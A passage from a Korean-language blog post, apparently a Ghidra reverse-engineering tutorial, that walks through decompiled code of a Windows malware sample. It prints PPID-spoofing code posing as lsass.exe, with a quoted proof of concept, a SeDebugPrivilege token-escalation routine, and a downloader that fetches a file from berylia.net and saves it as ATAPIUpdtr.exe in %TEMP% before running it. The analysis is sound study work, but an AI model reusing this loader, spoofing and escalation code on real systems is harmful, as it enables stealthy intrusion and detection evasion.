class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80010</span>,(LPVOID)<span class="hljs-number">0x0</span>,(LPCSTR)<span class="hljs-number">0x0</span>,                         (LPSTARTUPINFOA)&amp;local_84,(LPPROCESS_INFORMATION)&amp;local_94);      <span class="hljs-keyword">if</span> (WVar2 == <span class="hljs-number">0</span>) {        uVar4 = <span class="hljs-number">0</span>;      }      <span class="hljs-keyword">else</span> {        uVar4 = <span class="hljs-number">1</span>;      }    }  }  <span class="hljs-keyword">return</span> uVar4;}</code></pre><p>&#xBCF4;&#xAE30;&#xAC00; &#xC880; &#xD3B8;&#xD574;&#xC9C4; &#xAC70; &#xAC19;&#xC740; &#xB290;&#xB08C;&#xC774; &#xB4ED;&#xB2C8;&#xB2E4;. &#xC804;&#xCCB4;&#xC801;&#xC778; &#xBD80;&#xBD84;&#xC744; &#xD6D1;&#xC5B4;&#xBD24;&#xC744; &#xB54C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xD0D0;&#xC0C9;&#xC744; &#xD558;&#xBA70; <code>lsass.exe</code>&#xC640; &#xBE44;&#xAD50;&#xD558;&#xACE0; &#xAC19;&#xC744; &#xC2DC; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; ID&#xB97C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; <code>FUN_00401b91</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB124;&#xC694;. &#xADF8; &#xD6C4; &#xAC00;&#xC838;&#xC628; <code>lsass.exe</code>&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD578;&#xB4E4;&#xC744; &#xC5F4;&#xACE0; <code>IntitializeProcThreaddAttributeList</code>, <code>UpdateProcThreadAttribute</code> &#xB4F1;&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC78; &#xBCF4;&#xC544;&#x2026; <a href="https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing">PPID Spoofing</a>&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xB9C1;&#xD06C;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; <code>ppid-spoofing.cpp</code> &#xCF54;&#xB4DC;&#xC640; &#xBE44;&#xAD50;&#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;TlHelp32.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><span class="hljs-function"></span>{STARTUPINFOEXA si;PROCESS_INFORMATION pi;SIZE_T attributeSize;ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(STARTUPINFOEXA));HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, <span class="hljs-literal">false</span>, <span class="hljs-number">6200</span>);InitializeProcThreadAttributeList(<span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attributeSize);si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), <span class="hljs-number">0</span>, attributeSize);InitializeProcThreadAttributeList(si.lpAttributeList, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attributeSize);UpdateProcThreadAttribute(si.lpAttributeList, <span class="hljs-number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="hljs-keyword">sizeof</span>(HANDLE), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);si.StartupInfo.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFOEXA);CreateProcessA(<span class="hljs-literal">NULL</span>, (LPSTR)<span class="hljs-string">&quot;notepad&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, EXTENDED_STARTUPINFO_PRESENT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si.StartupInfo, &amp;pi);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD568;&#xC218;, &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xAC00; &#xB3D9;&#xC77C;&#xD55C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xADF8;&#xB7FC; &#xC774; &#xD589;&#xC704;&#xB97C; &#xC65C; &#xD558;&#xB290;&#xB0D0;?</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%203.png" alt></p><p>&#xB2F9;&#xC5F0;&#xD788; &#xD0D0;&#xC9C0;&#xB97C; &#xD53C;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;! PPID Spoofing&#xC744; &#xD558;&#xBA74; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; <code>lsass.exe</code>&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xC0DD;&#xC131;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xB3C4;&#xB85D; &#xD558;&#xBBC0;&#xB85C; &#xD0D0;&#xC9C0;&#xB97C; &#xD53C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xBB3C;&#xB860; &#xD0D0;&#xC9C0; &#xBC29;&#xBC95;&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xC9C0;&#xB9CC;&#xC694;.)</p><pre><code class="hljs cpp">CreateProcessA_addr = (CreateProcessA *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateProcessA&quot;</span>);      FUN_00401570();      WVar2 = (*CreateProcessA_addr)                        (DAT_00416028,(LPSTR)<span class="hljs-number">0x0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,                         (LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80010</span>,(LPVOID)<span class="hljs-number">0x0</span>,(LPCSTR)<span class="hljs-number">0x0</span>,                         (LPSTARTUPINFOA)&amp;local_84,(LPPROCESS_INFORMATION)&amp;local_94);</code></pre><p>PPID Spoofing&#xC744; &#xC9C4;&#xD589;&#xD55C; &#xD6C4;, &#xBC11;&#xC5D0; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; <code>FUN_00401570</code>&#xC744; &#xD638;&#xCD9C;&#xD55C; &#xD6C4; <code>CreateProcess</code>&#xB97C; &#xD1B5;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC815;&#xB9AC;&#xD558;&#xC790;&#xBA74; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; <code>lsass.exe</code>&#xC758; PID&#xB97C; &#xAC00;&#xC838;&#xC624;&#xACE0; <code>FUN_00401b91</code>&#xC744; &#xD638;&#xCD9C;&#xD55C; &#xD6C4; PPID Spoofing&#xC744; &#xC9C4;&#xD589;&#xD55C; &#xB4A4; <code>FUN_00401570</code>&#xC744; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; <code>CreateProcessA</code>&#xB97C; &#xD1B5;&#xD574; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB124;&#xC694;.</p><p>&#xADFC;&#xB370; &#xC544;&#xAE4C; &#xC704;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB358; &#xC8FC;&#xC18C;&#xC640; <code>Wlsass.exe</code>&#xAC00; &#xC544;&#xC9C1; &#xB098;&#xD0C0;&#xB098;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC74C;&#x2026; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xAE30;&#xB2A5;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5B4;&#xC788;&#xC744; &#xAC83; &#xAC19;&#xC740;&#xB370;? <code>FUN_00401b91</code>&#xC744; &#xBA3C;&#xC800; &#xD655;&#xC778;&#xD558;&#xBA74;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xD589;&#xC704;&#xB97C; &#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC8E0;!</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">token_priv_escalate</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  HANDLE thread_handle;  WINBOOL WVar1;  DWORD DVar2;  <span class="hljs-keyword">int</span> iVar3;  HANDLE token_handle;  ImpersonateSelf *ImpersonateSelf_addr;  OpenThreadToken *OpenThreadToken_addr;    OpenThreadToken_addr = (OpenThreadToken *)GetProcAddress(DAT_0041601c,<span class="hljs-string">&quot;OpenThreadToken&quot;</span>);  thread_handle = GetCurrentThread();  WVar1 = (*OpenThreadToken_addr)(thread_handle,<span class="hljs-number">0x28</span>,<span class="hljs-number">0</span>,&amp;token_handle);  <span class="hljs-keyword">if</span> (WVar1 == <span class="hljs-number">0</span>) {    DVar2 = GetLastError();    <span class="hljs-keyword">if</span> (DVar2 != <span class="hljs-number">0x3f0</span>) {      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    }    ImpersonateSelf_addr = (ImpersonateSelf *)GetProcAddress(DAT_0041601c,<span class="hljs-string">&quot;ImpersonateSelf&quot;</span>);    WVar1 = (*ImpersonateSelf_addr)(SecurityImpersonation);    <span class="hljs-keyword">if</span> (WVar1 == <span class="hljs-number">0</span>) {      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    }    thread_handle = GetCurrentThread();    WVar1 = (*OpenThreadToken_addr)(thread_handle,<span class="hljs-number">0x28</span>,<span class="hljs-number">0</span>,&amp;token_handle);    <span class="hljs-keyword">if</span> (WVar1 == <span class="hljs-number">0</span>) {      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    }  }  iVar3 = FUN_00401a9e(token_handle,<span class="hljs-string">L&quot;SeDebugPrivilege&quot;</span>);  <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) {    CloseHandle(token_handle);  }  <span class="hljs-keyword">return</span> iVar3 != <span class="hljs-number">0</span>;}</code></pre><p>&#xC2A4;&#xB808;&#xB4DC; &#xD1A0;&#xD070;&#xC744; &#xAC00;&#xC838;&#xC624;&#xACE0;, Impersonation&#xC744; &#xD558;&#xACE0;&#x2026; &#xAC00;&#xC7A5; &#xACB0;&#xC815;&#xC801;&#xC73C;&#xB85C; <code>SeDebugPrivilege</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. Privilege &#xB2E8;&#xC5B4;&#xB9CC; &#xBD10;&#xB3C4; &#xC9D0;&#xC791;&#xC774; &#xB418;&#xB294;&#xAD70;&#xC694;. &#xD760;&#xD760;&#x2026; &#xD574;&#xB2F9; Token Privilege Escalation &#xC778; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;! SeDebugPrivilege escalation &#xB4F1;&#xC73C;&#xB85C; &#xAD6C;&#xAE00;&#xB9C1;&#xC744; &#xD574;&#xBCF4;&#xBA74;</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%204.png" alt></p><p><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</a></p><p>&#xD1A0;&#xD070;&#xC744; &#xD1B5;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB098;&#xC640; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC11;&#xC73C;&#xB85C; &#xB0B4;&#xB824;&#xBCF4;&#xBA74;?</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%205.png" alt></p><p><code>SeDebugPrivilege</code>&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%206.png" alt></p><p><code>FUN_00401a9e</code>&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; <code>AdjustTokenPrivileges</code>&#xB97C; &#xD1B5;&#xD574; &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC5D0; &#xB300;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; <code>FUN_00401b91</code> &#xBD80;&#xBD84;&#xC740; Token Privilege escalation&#xC744; &#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774;&#xB124;&#xC694;. &#xADF8;&#xB7FC; &#xB2E4;&#xC74C; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xD560; &#xBD80;&#xBD84;&#xC778; <code>FUN_00401570</code>&#xC744; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401570</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  <span class="hljs-keyword">char</span> cVar1;  <span class="hljs-keyword">bool</span> bVar2;  undefined4 uVar3;  HMODULE hModule;  WINBOOL WVar4;  <span class="hljs-keyword">size_t</span> temp_path_len;  undefined4 *puVar5;  uint uVar6;  <span class="hljs-keyword">char</span> *pcVar7;  DWORD local_60;  DWORD local_5c;  DWORD local_58;  uint local_54;  InternetCloseHandle *InternetCloseHandle_addr;  WriteFile *WriteFile_addr;  InternetReadFile *InternetReadFile_addr;  HANDLE local_44;  CreateFileW *CreateFileW_addr;  <span class="hljs-keyword">char</span> *temp_path;  <span class="hljs-keyword">void</span> *local_38;  WINBOOL local_34;  HttpSendRequestA *HttpSendRequestA_addr;  InternetSetOptionW *InternetSetOptionW_addr;  InternetQueryOptionW *InternetQueryOptionW_addr;  HINTERNET local_24;  HttpOpenRequestW *HttpOpenRequestW_addr;  HINTERNET local_1c;  InternetConnectW *InternetConnectW_addr;  HINTERNET local_14;  InternetOpenW *InternetOpenW_addr;    InternetOpenW_addr = (InternetOpenW *)GetProcAddress(DAT_00416020,<span class="hljs-string">&quot;InternetOpenW&quot;</span>);  local_14 = (*InternetOpenW_addr)(<span class="hljs-string">L&quot;WINDOWS&quot;</span>,<span class="hljs-number">0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_14 == (HINTERNET)<span class="hljs-number">0x0</span>) {    uVar3 = <span class="hljs-number">0xe</span>;  }  <span class="hljs-keyword">else</span> {    hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);    InternetConnectW_addr = (InternetConnectW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);    local_1c = (*InternetConnectW_addr)                         (local_14,<span class="hljs-string">L&quot;berylia.net&quot;</span>,<span class="hljs-number">0x1bb</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (local_1c == (HINTERNET)<span class="hljs-number">0x0</span>) {      uVar3 = <span class="hljs-number">0xe</span>;    }    <span class="hljs-keyword">else</span> {      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);      HttpOpenRequestW_addr = (HttpOpenRequestW *)GetProcAddress(hModule,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);      local_24 = (*HttpOpenRequestW_addr)                           (local_1c,<span class="hljs-string">L&quot;GET&quot;</span>,<span class="hljs-string">L&quot;/index/&quot;</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR *)<span class="hljs-number">0x0</span>,                            <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (local_24 == (HINTERNET)<span class="hljs-number">0x0</span>) {        uVar3 = <span class="hljs-number">0xe</span>;      }      <span class="hljs-keyword">else</span> {        local_58 = <span class="hljs-number">4</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetQueryOptionW_addr =             (InternetQueryOptionW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetQueryOptionW&quot;</span>);        WVar4 = (*InternetQueryOptionW_addr)(local_24,<span class="hljs-number">0x1f</span>,&amp;local_54,&amp;local_58);        <span class="hljs-keyword">if</span> (WVar4 != <span class="hljs-number">0</span>) {          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetSetOptionW_addr =               (InternetSetOptionW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetSetOptionW&quot;</span>);          local_54 = local_54 | <span class="hljs-number">0x1180</span>;          (*InternetSetOptionW_addr)(local_24,<span class="hljs-number">0x1f</span>,&amp;local_54,<span class="hljs-number">4</span>);        }        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        HttpSendRequestA_addr = (HttpSendRequestA *)GetProcAddress(hModule,<span class="hljs-string">&quot;HttpSendRequestA&quot;</span>);        local_34 = (*HttpSendRequestA_addr)(local_24,(LPCSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">0</span>,(LPVOID)<span class="hljs-number">0x0</span>,<span class="hljs-number">0</span>);        local_38 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(local_38,<span class="hljs-number">0</span>,<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(DAT_00416024,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);        temp_path = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);        temp_path_len = <span class="hljs-built_in">strlen</span>(temp_path);        DAT_00416028 = (LPCSTR)<span class="hljs-built_in">malloc</span>(temp_path_len + <span class="hljs-number">0x1000</span>);        <span class="hljs-built_in">strcpy</span>(DAT_00416028,temp_path);        uVar6 = <span class="hljs-number">0xffffffff</span>;        pcVar7 = DAT_00416028;        <span class="hljs-keyword">do</span> {          <span class="hljs-keyword">if</span> (uVar6 == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;          uVar6 = uVar6 - <span class="hljs-number">1</span>;          cVar1 = *pcVar7;          pcVar7 = pcVar7 + <span class="hljs-number">1</span>;        } <span class="hljs-keyword">while</span> (cVar1 != <span class="hljs-string">&apos;\0&apos;</span>);        puVar5 = (undefined4 *)(DAT_00416028 + (~uVar6 - <span class="hljs-number">1</span>));        *puVar5 = <span class="hljs-number">0x4154415c</span>;        puVar5[<span class="hljs-number">1</span>] = <span class="hljs-number">0x70554950</span>;        puVar5[<span class="hljs-number">2</span>] = <span class="hljs-number">0x2e727464</span>;        puVar5[<span class="hljs-number">3</span>] = <span class="hljs-number">0x657865</span>;        MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_00416028,<span class="hljs-number">-1</span>,DAT_00416024,<span class="hljs-number">0x1000</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        CreateFileW_addr = (CreateFileW *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateFileW&quot;</span>);        local_44 = (*CreateFileW_addr)(DAT_00416024,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,                                       (HANDLE)<span class="hljs-number">0x0</span>);        local_5c = <span class="hljs-number">0</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetReadFile_addr = (InternetReadFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        WriteFile_addr = (WriteFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;WriteFile&quot;</span>);        <span class="hljs-keyword">if</span> (local_34 == <span class="hljs-number">0</span>) {          uVar3 = <span class="hljs-number">0xe</span>;        }        <span class="hljs-keyword">else</span> {          local_60 = <span class="hljs-number">0</span>;          <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) {            WVar4 = (*InternetReadFile_addr)(local_24,local_38,<span class="hljs-number">0x2000</span>,&amp;local_60);            <span class="hljs-keyword">if</span> ((WVar4 == <span class="hljs-number">0</span>) || (local_60 == <span class="hljs-number">0</span>)) {              bVar2 = <span class="hljs-literal">false</span>;            }            <span class="hljs-keyword">else</span> {              bVar2 = <span class="hljs-literal">true</span>;            }            <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;            (*WriteFile_addr)(local_44,local_38,local_60,&amp;local_5c,(LPOVERLAPPED)<span class="hljs-number">0x0</span>);          }          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetCloseHandle_addr =               (InternetCloseHandle *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetCloseHandle&quot;</span>);          CloseHandle(local_44);          (*InternetCloseHandle_addr)(local_14);          (*InternetCloseHandle_addr)(local_1c);          (*InternetCloseHandle_addr)(local_24);          uVar3 = <span class="hljs-number">1</span>;        }      }    }  }  <span class="hljs-keyword">return</span> uVar3;}</code></pre><p>&#xC0C1;&#xB2F9;&#xD788; &#xAE30;&#xB124;&#xC694;&#x2026; &#xB098;&#xB220;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC544;&#xC57C; &#xD560; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC911;&#xC694;&#xD55C; &#xBD80;&#xBD84;&#xB9CC; &#xBF51;&#xC544;&#xB0B4;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD569;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs cpp">InternetConnectW_addr = (InternetConnectW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);local_1c = (*InternetConnectW_addr)           (local_14,<span class="hljs-string">L&quot;berylia.net&quot;</span>,<span class="hljs-number">0x1bb</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);</code></pre><p>&#xC704;&#xC5D0;&#xC11C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC0B4;&#xD3B4;&#xBCFC; &#xB54C; &#xB098;&#xC654;&#xB358; <code>berylia.net</code>&#xC774; &#xC5EC;&#xAE30;&#xC11C; &#xB098;&#xC624;&#xB124;&#xC694;. <code>InternetConnectW</code>&#xB85C; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xC5F0;&#xACB0;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">HttpOpenRequestW_addr = (HttpOpenRequestW *)GetProcAddress(hModule,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);local_24 = (*HttpOpenRequestW_addr)           (local_1c,<span class="hljs-string">L&quot;GET&quot;</span>,<span class="hljs-string">L&quot;/index/&quot;</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR *)<span class="hljs-number">0x0</span>,            <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);</code></pre><p>&#xADF8;&#xB9AC;&#xACE0; GET Request&#xB97C; &#xBCF4;&#xB0B4;&#xB124;&#xC694;. &#xC74C;. &#xB300;&#xCDA9; &#xC608;&#xC0C1;&#xC744; &#xD574;&#xBCF4;&#xBA74; request&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD55C;&#xB2E4;&#xB77C;&#xB294; &#xAC00;&#xC815;&#xC744; &#xC138;&#xC6B8; &#xC218; &#xC788;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC11;&#xC5D0;&#xB97C; &#xB354; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><pre><code class="hljs cpp">temp_path = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);temp_path_len = <span class="hljs-built_in">strlen</span>(temp_path);DAT_00416028 = (LPCSTR)<span class="hljs-built_in">malloc</span>(temp_path_len + <span class="hljs-number">0x1000</span>);<span class="hljs-built_in">strcpy</span>(DAT_00416028,temp_path);</code></pre><p>&#xD658;&#xACBD;&#xBCC0;&#xC218;&#xC5D0; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB294; TEMP &#xD3F4;&#xB354;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xBC1B;&#xC544;&#xC624;&#xB124;&#xC694;. &#xC704;&#xC5D0; &#xC815;&#xBCF4;&#xC5D0;&#xC11C; &#xB354; &#xCD94;&#xAC00;&#xB97C; &#xD574;&#xBCF4;&#xBA74; temp &#xACBD;&#xB85C;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;.</p><pre><code class="hljs cpp">MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_00416028,<span class="hljs-number">-1</span>,DAT_00416024,<span class="hljs-number">0x1000</span>);hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);CreateFileW_addr = (CreateFileW *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateFileW&quot;</span>);local_44 = (*CreateFileW_addr)(DAT_00416024,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,                               (HANDLE)<span class="hljs-number">0x0</span>);local_5c = <span class="hljs-number">0</span>;hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);InternetReadFile_addr = (InternetReadFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);WriteFile_addr = (WriteFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;WriteFile&quot;</span>);<span class="hljs-keyword">if</span> (local_34 == <span class="hljs-number">0</span>) {    uVar3 = <span class="hljs-number">0xe</span>;}<span class="hljs-keyword">else</span> {    local_60 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) {        WVar4 = (*InternetReadFile_addr)(local_24,local_38,<span class="hljs-number">0x2000</span>,&amp;local_60);        <span class="hljs-keyword">if</span> ((WVar4 == <span class="hljs-number">0</span>) || (local_60 == <span class="hljs-number">0</span>)) {            bVar2 = <span class="hljs-literal">false</span>;        }        <span class="hljs-keyword">else</span> {            bVar2 = <span class="hljs-literal">true</span>;        }        <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;        (*WriteFile_addr)(local_44,local_38,local_60,&amp;local_5c,(LPOVERLAPPED)<span class="hljs-number">0x0</span>);}</code></pre><p>&#xC5B4;&#xAE40;&#xC5C6;&#xC774; &#xC608;&#xC0C1;&#xC740; &#xC801;&#xC911;&#xD569;&#xB2C8;&#xB2E4;. <code>InternetReadFile</code>&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC5B4;&#xC640; <code>%TEMP%</code>&#xC5D0; <code>CreateFile</code>&#xC744; &#xD558;&#xB294;&#xAD70;&#xC694;. &#xC800;&#xC7A5;&#xB418;&#xB294; &#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xC740; &#xBB34;&#xC5C7;&#xC77C;&#xAE4C;&#x2026;</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%207.png" alt></p><p><code>ATAPIUpdtr.exe</code> &#xD30C;&#xC77C;&#xC774;&#xB124;&#xC694;.</p><h1 id="&#xC815;&#xB9AC;"><a href="#&#xC815;&#xB9AC;" class="headerlink" 